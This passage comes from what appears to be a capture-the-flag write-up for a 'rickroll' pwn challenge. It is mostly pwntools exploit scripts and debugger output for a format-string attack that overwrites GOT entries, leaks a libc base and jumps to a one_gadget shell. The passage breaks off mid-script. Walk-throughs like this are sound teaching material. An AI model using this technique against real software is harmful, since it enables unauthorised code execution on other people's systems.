</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011a7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">85</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401050</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">90</span><span style="color:#f92672">&gt;</span>:	mov    rdx,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2ead</span>]        <span style="color:#75715e"># 0x404060 &lt;stdin@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011b3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">97</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x100</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ba</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">104</span><span style="color:#f92672">&gt;</span>:	mov    esi,<span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011bf</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">109</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011c2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">112</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401060</span> <span style="color:#f92672">&lt;</span>fgets<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011c7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">117</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe52</span>]        <span style="color:#75715e"># 0x402020</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ce</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">124</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">129</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401050</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">134</span><span style="color:#f92672">&gt;</span>:	lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x100</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011df</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">141</span><span style="color:#f92672">&gt;</span>:	mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">144</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">149</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401050</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011ec</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">154</span><span style="color:#f92672">&gt;</span>:	lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe7d</span>]        <span style="color:#75715e"># 0x402070</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">161</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x401030</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">166</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011fd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">171</span><span style="color:#f92672">&gt;</span>:	leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004011fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">172</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>So here is what we&rsquo;re going to do:</p>
<ul>
<li>First, we will overwrite <code>puts</code>&rsquo;s <code>GOT</code> entry by <em>any address from the main function</em> thanks to our <em>format string vuln</em>, so that when the code reaches the <code>puts</code> at the bottom of <code>main</code>, it goes back up</li>
<li>Then, we will leak <code>libc</code> and calculate its base</li>
<li>We will then overwrite <code>printf</code>&rsquo;s <code>GOT</code> entry by a <em>one gadget</em> (hoping the restrictions can be matched)</li>
</ul>
<p>For the first part, we need to figure out where our input &ldquo;lives&rdquo;, to do so, we enter a bunch of <em>A</em>&rsquo;s, and see where they end up:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">./</span>rickroll
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Lyrics: AAAAAAAA <span style="color:#f92672">-</span> <span style="color:#f92672">%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Never gonna run around <span style="color:#f92672">and</span> AAAAAAAA <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7fff55ecfa20</span><span style="color:#f92672">.</span>(nil)<span style="color:#ae81ff">.0</span>x7f5d62d80a37<span style="color:#ae81ff">.0</span>x4d<span style="color:#ae81ff">.0</span>x1a4a2a0<span style="color:#ae81ff">.0</span>x4141414141414141<span style="color:#ae81ff">.0</span>x70252e7025202d20<span style="color:#ae81ff">.0</span>x252e70252e70252e<span style="color:#ae81ff">.0</span>x2e70252e70252e70<span style="color:#ae81ff">.0</span>x70252e70252e7025<span style="color:#ae81ff">.0</span>x252e70252e70252e<span style="color:#ae81ff">.0</span>x2e70252e70252e70<span style="color:#ae81ff">.0</span>x70252e70252e7025<span style="color:#ae81ff">.0</span>x252e70252e70252e<span style="color:#ae81ff">.0</span>x2e70252e70252e70<span style="color:#ae81ff">.0</span>x70252e70252e7025<span style="color:#ae81ff">.0</span>x252e70252e70252e<span style="color:#ae81ff">.0</span>xa70252e70<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span></code></pre></div><p>We see that the <em>6th</em> leak is <code>0x41414141...</code>, <code>0x41</code> is a capital <em>A</em>, so this is where our input lives.</p>
<p>Knowing that, we can start making our exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./rickroll&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;lac.tf&#34;</span>, <span style="color:#ae81ff">31135</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040117d</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We replace puts by main+43 so that when puts is called it returns to main</span>
</span></span><span style="display:flex;"><span>    writes <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]:main
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We use the format string payload from pwntools, telling him where our input lives</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>,writes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics:&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Now, we are back to the top of the main function</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#r.interactive()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>After checking that it works, we can now think about step 2: leaking <code>libc</code></p>
<p>To do so, we can make a quick script to generate a payload that will print more addresses and check what they are with <code>pwndbg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">50</span>):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; = %&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;$p &#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(payload)
</span></span></code></pre></div><p>Entering our payload in the input, we get this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>25 = 0x25203d2039332070 26 = 0x2030342070243933 27 = 0x207024303425203d 28 = 0x313425203d203134 29 = 0x203d203234207024 30 = 0x3334207024323425 31 = 0x7024333425203d20 32 = 0x3425203d20343420 33 = 0x3d20353420702434 34 = 0x3420702435342520 35 = 0x24363425203d2036 36 = 0x25203d2037342070 37 = 0x38342070243734 38 = 0x1 39 = 0x7ffff7da3d90 40 = (nil) 41 = 0x401152 42 = 0x100000000 43 = 0x7fffffffe028 44 = (nil) 45 = 0x6c3d408a4458d46 46 = 0x7fffffffe028 47 = 0x401152
</span></span></code></pre></div><p>After inspecting the interesting addresses (the ones that start with <code>0x7f....</code>), we know that the <em>39th</em> address corresponds to <code>&lt;__libc_start_call_main+128&gt;</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>x <span style="color:#ae81ff">0x7ffff7da3d90</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x7ffff7da3d90</span> <span style="color:#f92672">&lt;</span>__libc_start_call_main<span style="color:#f92672">+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">&gt;</span>:	<span style="color:#ae81ff">0x89</span>
</span></span></code></pre></div><blockquote>
<p>After realising that the <em>remote</em> address at position 39 looks something like <code>0x40xxxx</code>, I poked around and tried to find where the libc address was. This usually happens because the stack layout is not the same locally and remotely and sometimes the position is a bit different</p>
</blockquote>
<p>We can complete our exploit with the leak:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./rickroll&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;lac.tf&#34;</span>, <span style="color:#ae81ff">31135</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040117d</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We replace puts by main+43 so that when puts is called it returns to main</span>
</span></span><span style="display:flex;"><span>    writes <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]:main
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We use the format string payload from pwntools, telling him where our input lives</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>,writes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics:&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Now, we are back to the top of the main function</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.%40$p&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Leak the 40th element on the stack (&lt;__libc_start_call_main+128&gt;)</span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Make it an integer</span>
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Leak =&#34;</span>, hex(leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Calculate libc address by doing leak - (leak - base)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x7f1c6ed22d0a</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7f1c6ecff000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;libc address = &#34;</span>, hex(libc<span style="color:#f92672">.</span>address))
</span></span></code></pre></div><p>Now that we have the base of <code>libc</code>, we can overwrite <code>printf</code> with a <em>one gadget</em> that will give us a shell&hellip; let&rsquo;s look for a  <code>one gadget</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>one_gadget libc<span style="color:#f92672">-</span><span style="color:#ae81ff">2.31</span><span style="color:#f92672">.</span>so
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xc961a</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, r12, r13)
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  [r12] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r12 <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>  [r13] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r13 <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xc961d</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, r12, rdx)
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  [r12] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r12 <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>  [rdx] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rdx <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xc9620</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsi, rdx)
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  [rsi] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rsi <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>  [rdx] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rdx <span style="color:#f92672">==</span> NULL
</span></span></code></pre></div><p>Let&rsquo;s try them one by one until we find one that works</p>
<blockquote>
<p>I had to re-do the <code>AAAA %p %p %p</code> trick because the input had moved from <code>6th</code> to <code>8th</code> position</p>
</blockquote>
<p>After testing them one by one, I figured the last one works.</p>
<h2 id="final-payload">Final Payload</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./rickroll&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;lac.tf&#34;</span>, <span style="color:#ae81ff">31135</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040117d</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We replace puts by main+43 so that when puts is called it returns to main</span>
</span></span><span style="display:flex;"><span>    writes <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]:main
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We use the format string payload from pwntools, telling him where our input lives</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>,writes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics:&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Now, we are back to the top of the main function</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.%40$p&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Leak the 40th element on the stack (&lt;__libc_start_call_main+128&gt;)</span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Make it an integer</span>
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Leak =&#34;</span>, hex(leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Calculate libc address by doing leak - (leak - base)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x7f1c6ed22d0a</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7f1c6ecff000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;libc address = &#34;</span>, hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Dont forget to add the base of libc </span>
</span></span><span style="display:flex;"><span>    one_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc9620</span> <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    writes <span style="color:#f92672">=</span> {
